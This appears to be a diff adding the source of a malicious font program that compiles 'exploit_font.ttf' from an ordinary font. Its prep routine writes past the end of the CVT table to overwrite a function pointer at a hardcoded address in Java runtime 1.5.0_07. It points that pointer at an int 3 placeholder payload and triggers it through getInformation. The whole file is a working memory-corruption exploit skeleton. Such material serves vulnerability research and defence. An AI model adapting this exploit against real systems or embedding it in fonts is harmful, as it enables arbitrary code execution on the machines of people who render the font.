@@ -1,0 +1,39 @@
+      #input "original_font.ttf"
+      #output "exploit_font.ttf"
+
+      #cvt cvt0: 0
+
+      // This is our definition of the preparation
+      // function
+      // This will get called repeatedly when rendering
+      // text in this font
+
+      void prep()
+      {
+      // Function 0x89 is getInformation
+      int iFn = 0x89;
+
+      // Address of function pointer table for
+      // JRE 1.5.0_07
+      int iFnPtrTable = 0x6D27BB00;
+
+      // End of CVT
+      int iEndCVT = int(getCVT(uint(-0x38)));
+
+      // Location we need to overwrite
+      int iLocation = iFnPtrTable + int((fixed(iFn) * 4.0));
+
+      // Fill CVT with our payload (some int 3's)
+      setCVT(uint(0), 0xCCCCCCCC);
+
+      // Perform overwrite
+      // We substract 4 from iEndCVT to get the address
+      // the start of the CVT (i.e. the address of our
+      // payload)
+      setCVT(uint(fixed(fixed((iLocation - iEndCVT)) / 4.0)), iEndCVT - 
+0x4);
+
+      // Trigger payload by calling getInformation
+      getInformation(uint(0));
+      }
+
